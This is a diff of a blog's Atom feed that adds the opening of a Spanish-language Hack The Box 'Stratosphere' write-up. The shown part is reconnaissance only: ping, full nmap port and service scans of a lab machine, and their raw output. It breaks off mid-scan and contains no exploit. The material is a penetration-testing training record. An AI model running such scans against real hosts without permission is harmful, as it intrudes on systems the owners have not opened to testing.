@@ -1,4 +1,734 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-11T23:05:06-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Jeeves</title><link href="http://localhost:4000/htb-jeeves/" rel="alternate" type="text/html" title="Hack The Box Jeeves" /><published>2021-10-11T00:00:00-05:00</published><updated>2021-10-11T00:00:00-05:00</updated><id>http://localhost:4000/htb-jeeves</id><content type="html" xml:base="http://localhost:4000/htb-jeeves/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jeeves/banner-jeeves.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-14T00:19:02-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Stratosphere</title><link href="http://localhost:4000/htb-stratosphere/" rel="alternate" type="text/html" title="Hack The Box Stratosphere" /><published>2021-10-12T00:00:00-05:00</published><updated>2021-10-12T00:00:00-05:00</updated><id>http://localhost:4000/htb-stratosphere</id><content type="html" xml:base="http://localhost:4000/htb-stratosphere/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-stratosphere/banner-stratosphere.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;stratosphere&quot;&gt;Stratosphere&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.64.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.64
+PING 10.10.10.64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.64: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;184 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.64 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 184.278/184.278/184.278/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.64 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-12 15:02 CDT
+Initiating SYN Stealth Scan at 15:02
+Scanning 10.10.10.64 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.64
+Discovered open port 22/tcp on 10.10.10.64
+Discovered open port 8080/tcp on 10.10.10.64
+Stats: 0:00:24 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 62.64% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 15:02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:14 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Completed SYN Stealth Scan at 15:03, 39.59s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.64
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-10-12 15:02:21 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;39s
+Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;39.69 seconds
+           Raw packets sent: 196627 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.652MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.364KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.64
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,8080
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,8080 10.10.10.64 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted                                                                             
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-12 15:05 CDT                                                                  
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.64                                                                                                 
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                      
+                                                                                                                                 
+PORT     STATE SERVICE    VERSION                                                                                                
+22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                          
+| ssh-hostkey:                                                                                                                   
+|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                   
+|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                  
+|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                
+80/tcp   open  http                                                                                                              
+|_http-title: Stratosphere                                                                                                       
+| fingerprint-strings:                                                                                                           
+|   FourOhFourRequest:                                                                                                           
+|     HTTP/1.1 404                                                                                                               
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8                                                                                      
+|     Content-Language: en                                                                                                       
+|     Content-Length: 1114                                                                                                       
+|     Date: Tue, 12 Oct 2021 20:10:28 GMT                                                                                        
+|     Connection: close                                                                                                          
+|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;doctype html&amp;gt;&amp;lt;html &lt;span class=&quot;nv&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;HTTP Status 404                                                                
+|     Found&amp;lt;/title&amp;gt;&amp;lt;style &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;h1 &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:
+22px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; h2 &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:16px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; h3 &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial
+,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:14px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; body &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;backgroun
+d-color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; b &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; p &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-se
+rif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:12px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; a &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; a.name &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; .line &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;height:1px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D
+76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;border:none&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+|   GetRequest:                                                                                                                  
+|     HTTP/1.1 200                                                                                                               
+|     Accept-Ranges: bytes                                                                                                       
+|     ETag: W/&lt;span class=&quot;s2&quot;&gt;&quot;1708-1519762495000&quot;&lt;/span&gt;                                                                                               
+|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT                                                                               
+|     Content-Type: text/html                                                                                                    
+|     Content-Length: 1708                                                                                                       
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT                                                                                        
+|     Connection: close                                                                                                          
+|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;                                                                                                            
+|     &amp;lt;html&amp;gt;                                                                                                                     
+|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                     
+|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;/&amp;gt;                                                                                                    
+|     &amp;lt;title&amp;gt;Stratosphere&amp;lt;/title&amp;gt;                                                                                                
+|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;main.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                    
+|     &amp;lt;/head&amp;gt;                                                                                                                    
+|     &amp;lt;body&amp;gt;                                                                                                                     
+|     &amp;lt;div &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;background&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/div&amp;gt;                                                                                                
+|     &amp;lt;header &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;main-header&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                   
+|     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                    
+|     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-wrap&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                 
+|     &amp;lt;p&amp;gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fa fa-diamond&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/i&amp;gt;&amp;lt;/p&amp;gt;                                                                                       
+|     &amp;lt;nav&amp;gt;
+|     &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;btn&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GettingStarted.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Get started&amp;lt;/a&amp;gt;
+|     &amp;lt;/nav&amp;gt;
+|     &amp;lt;/div&amp;gt;
+|     &amp;lt;/div&amp;gt;
+|     &amp;lt;/header&amp;gt;
+|     &amp;lt;section &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;greeting&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+|     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+|     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-wrap&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+|     &amp;lt;h1&amp;gt;Stratosphere&amp;lt;br&amp;gt;We protect your credit.&amp;lt;/h1&amp;gt;
+|     &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;btn&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GettingStarted.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Get started now&amp;lt;/a&amp;gt; 
+|     &amp;lt;p&amp;gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ar
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+|     Content-Length: 0
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|   RTSPRequest, X11Probe: 
+|     HTTP/1.1 400 
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|_    Connection: close
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+8080/tcp open  http-proxy
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Stratosphere
+|_http-open-proxy: Proxy might be redirecting requests
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1114
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|     &amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&quot;&lt;/span&gt;en&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;HTTP Status 404 
+|     Found&amp;lt;/title&amp;gt;&amp;lt;style type=&quot;&lt;/span&gt;text/css&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:
+22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial
+,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;backgroun
+d-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-se
+rif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D
+76;border:none;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Accept-Ranges: bytes
+|     ETag: W/&quot;&lt;/span&gt;1708-1519762495000&lt;span class=&quot;s2&quot;&gt;&quot;
+|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
+|     Content-Type: text/html
+|     Content-Length: 1708
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|     &amp;lt;!DOCTYPE html&amp;gt;
+|     &amp;lt;html&amp;gt;
+|     &amp;lt;head&amp;gt;
+|     &amp;lt;meta charset=&quot;&lt;/span&gt;utf-8&lt;span class=&quot;s2&quot;&gt;&quot;/&amp;gt;
+|     &amp;lt;title&amp;gt;Stratosphere&amp;lt;/title&amp;gt;
+|     &amp;lt;link rel=&quot;&lt;/span&gt;stylesheet&lt;span class=&quot;s2&quot;&gt;&quot; type=&quot;&lt;/span&gt;text/css&lt;span class=&quot;s2&quot;&gt;&quot; href=&quot;&lt;/span&gt;main.css&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+|     &amp;lt;/head&amp;gt;
+|     &amp;lt;body&amp;gt;
+|     &amp;lt;div id=&quot;&lt;/span&gt;background&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/div&amp;gt;
+|     &amp;lt;header id=&quot;&lt;/span&gt;main-header&lt;span class=&quot;s2&quot;&gt;&quot; class=&quot;&lt;/span&gt;hidden&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+|     &amp;lt;div class=&quot;&lt;/span&gt;container&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+|     &amp;lt;div class=&quot;&lt;/span&gt;content-wrap&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; 
+|     &amp;lt;p&amp;gt;&amp;lt;i class=&quot;&lt;/span&gt;fa fa-diamond&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/p&amp;gt;
+|     &amp;lt;nav&amp;gt;
+|     class=&quot;&lt;/span&gt;btn&lt;span class=&quot;s2&quot;&gt;&quot; href=&quot;&lt;/span&gt;GettingStarted.html&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Get started&amp;lt;/a&amp;gt;
+|     &amp;lt;/nav&amp;gt;
+|     &amp;lt;/div&amp;gt;
+|     &amp;lt;/div&amp;gt;
+|     &amp;lt;/header&amp;gt;
+|     &amp;lt;section id=&quot;&lt;/span&gt;greeting&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+|     &amp;lt;div class=&quot;&lt;/span&gt;container&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+|     &amp;lt;div class=&quot;&lt;/span&gt;content-wrap&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; 
+|     &amp;lt;h1&amp;gt;Stratosphere&amp;lt;br&amp;gt;We protect your credit.&amp;lt;/h1&amp;gt;
+|     class=&quot;&lt;/span&gt;btn&lt;span class=&quot;s2&quot;&gt;&quot; href=&quot;&lt;/span&gt;GettingStarted.html&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;Get started now&amp;lt;/a&amp;gt; 
+|     &amp;lt;p&amp;gt;&amp;lt;i class=&quot;&lt;/span&gt;ar
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+|     Content-Length: 0
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|_    Connection: close
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http
+s://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;span class=&quot;o&quot;&gt;==============&lt;/span&gt;NEXT SERVICE FINGERPRINT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SUBMIT INDIVIDUALLY&lt;span class=&quot;o&quot;&gt;)==============&lt;/span&gt;
